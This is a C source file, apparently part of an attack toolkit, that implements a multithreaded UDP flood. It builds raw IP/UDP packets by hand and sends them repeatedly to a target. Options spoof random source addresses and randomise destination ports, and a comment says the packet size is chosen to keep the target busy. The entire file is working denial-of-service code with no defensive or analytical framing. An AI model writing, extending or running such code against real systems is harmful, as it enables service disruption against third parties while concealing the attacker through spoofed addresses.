#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <pthread.h>
#include <stdarg.h>
#include <string.h> // memcpy

#include <unistd.h>
#include <netinet/ip.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/udp.h>
#include <arpa/inet.h>

#include "../main.h"

static int _send_udp_packet(const char *daddr, const int dport, const char *saddr, const int sport, const int rt, const int udps)
{

    // for UDP padding size
    // make sure the size is very small
    // same traffic will send more packets that make the target busy
    int padding_size = PADDING_SIZE;
    if (udps)
        // dynamic packet size enable
        // get the random number from [1, 8]
        // The number of bytes is a multiple of 4
        // limited: MTU = 1500
        padding_size = ((1 + randport() % 4) * 4);

    int socket_fd;
    socket_fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (socket_fd < 0)
        error(strerror(errno));

    int size = sizeof(struct ip) + sizeof(struct udphdr) + padding_size;
    char *datagram = (char *)calloc(size, sizeof(char));

    struct ip *iph = (struct ip *)datagram;
    struct udphdr *udph = (struct udphdr *)(datagram + sizeof(struct ip));

    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(dport);
    sin.sin_addr.s_addr = inet_addr(daddr);

    // ip header
    iph->ip_v = 4;
    iph->ip_hl = 5;
    iph->ip_tos = 0;
    iph->ip_len = sizeof(struct ip) + sizeof(struct udphdr) + padding_size;
    iph->ip_id = htons(randport());
    iph->ip_off = 0;
    iph->ip_ttl = 255;
    iph->ip_p = IPPROTO_UDP;
    iph->ip_sum = 0; // a remplir aprés
    iph->ip_src.s_addr = inet_addr(saddr);
    iph->ip_dst.s_addr = inet_addr(daddr);
    iph->ip_sum = htons(checksum((unsigned short *)datagram, sizeof(struct ip), NULL, 0));

    // udp header
    udph->uh_sport = htons(sport);
    udph->uh_dport = htons(dport);
    udph->uh_ulen = htons(sizeof(struct udphdr) + padding_size);
    udph->uh_sum = 0;

    char *data = (char *)(datagram + sizeof(struct ip) + sizeof(struct udphdr));
    // filed the data
    int n = (padding_size >> 2);
    int i;
    for (i = 0; i < n; i++)
        memcpy(data + (i * 4), "love", 4);

    struct pseudo_header_udp *psh = (struct pseudo_header_udp *)malloc(sizeof(struct pseudo_header_udp));
    psh->source_address = inet_addr(saddr);
    psh->dest_address = sin.sin_addr.s_addr;
    psh->placeholder = 0;
    psh->protocol = IPPROTO_UDP;
    psh->udp_length = htons(sizeof(struct udphdr) + padding_size);
    memcpy(&psh->udph, udph, sizeof(struct udphdr));
    udph->uh_sum = htons(checksum((unsigned short *)psh, sizeof(struct pseudo_header_udp), data, padding_size));

    free(psh);

    int one = 1;
    if (setsockopt(socket_fd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(int)) < 0)
        error(strerror(errno));

    // envoi
    for (int i = 0; i < rt; i++)
        if (sendto(socket_fd, datagram, size, 0, (struct sockaddr *)&sin, sizeof(struct sockaddr)) < 0)
            error(strerror(errno));

    close(socket_fd);
    free(datagram);
    return 0;
}

static void _attack_thread(pUFTP parameters)
{
    char *daddr = parameters->daddr;
    char *saddr = parameters->saddr;
    int rt = parameters->rep;
    int ddps = parameters->ddps;
    int sport = parameters->sport;
    int dport = parameters->dport;

#ifdef DEBUG
    warning("thread start...");
    warning("sending udp packet...");
    _send_udp_packet(daddr, dport, saddr, sport, rt, ddps);
#else
    unsigned int pn = parameters->pn;
    if (parameters->rdsrc)
    {
        saddr = (char *)malloc(sizeof(char) * MAX_IP_LENGTH);
        for (unsigned int i = 1; i != pn; i++)
        {
            if (parameters->ddpp)
                dport = randport();
            saddr = randip(&saddr);
            sport = randport();
            _send_udp_packet(daddr, dport, saddr, sport, rt, ddps);
        }
    }
    else
    {
        for (unsigned int i = 1; i != pn; i++)
        {
            if (parameters->ddpp)
                dport = randport();
            _send_udp_packet(daddr, dport, saddr, sport, rt, ddps);
        }
    }
#endif
}

int udp_flood_attack(char *url, int port, ...)
{

    int i;
    va_list vlist;
    va_start(vlist, port);
    int rdsrc = va_arg(vlist, int);
    int rt = va_arg(vlist, int);
    int thread_number = va_arg(vlist, int);
    char *saddr = va_arg(vlist, char *);
    int sport = va_arg(vlist, int);
    int ddps = va_arg(vlist, int);
    int ddpp = va_arg(vlist, int);
    va_end(vlist);

    pUFTP parameters = (pUFTP)malloc(sizeof(UFTP));
    parameters->daddr = url;
    parameters->dport = port;
    parameters->saddr = saddr;
    parameters->sport = sport;
    parameters->rep = rt;
    parameters->rdsrc = rdsrc;
    parameters->ddps = ddps;
    parameters->ddpp = ddpp;

    pthread_t tid_list[thread_number];
    pthread_attr_t attr;
    int ret;

    for (i = 0; i < thread_number; i++)
    {
        //input->serial_num = (i * input->max_thread) + j;
        if (pthread_attr_init(&attr))
            error(strerror(errno));
        // if (pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED))
        if (pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_JOINABLE))
            error(strerror(errno));
        // create thread
        ret = pthread_create(&tid_list[i], &attr, (void *)_attack_thread, parameters);
        if (ret != 0)
            error("create pthread failed, ret: %d, %s", ret, strerror(errno));
        pthread_attr_destroy(&attr);
    }
    // pthread_detach(tid);
    // join them all
    for (i = 0; i < thread_number; i++)
        pthread_join(tid_list[i], NULL);

    free(parameters);
    return 0;
}
